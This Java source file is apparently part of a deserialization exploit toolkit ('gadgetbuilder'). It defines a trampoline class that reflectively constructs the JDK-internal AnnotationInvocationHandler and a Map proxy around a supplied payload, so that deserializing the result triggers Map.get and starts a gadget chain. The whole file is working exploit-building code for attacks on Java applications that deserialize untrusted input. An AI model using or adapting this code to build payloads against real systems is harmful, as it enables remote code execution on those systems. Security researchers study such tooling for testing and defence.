package org.ses.gadgetbuilder.impl.trampolines;

import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.chains.trampolines.singleparam.MapGetTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Map;

@Dependencies()
public class AnnotationInvocationHandlerMapGet implements MapGetTrampoline {

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    @Override
    public Object wrapPayload(Object payload, Object param) {
        Object triggerGadget = null;

        try {
            InvocationHandler handler = (InvocationHandler) Reflections.getFirstCtor(
                    ANN_INV_HANDLER_CLASS).newInstance(Override.class, payload);
            Map mapProxy = (Map) Proxy.newProxyInstance(MapGetTrampoline.class.getClassLoader(), new Class[]{Map.class}, handler);

            triggerGadget = Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, mapProxy);

        } catch (Exception e) {    }

        return triggerGadget;
    }
}
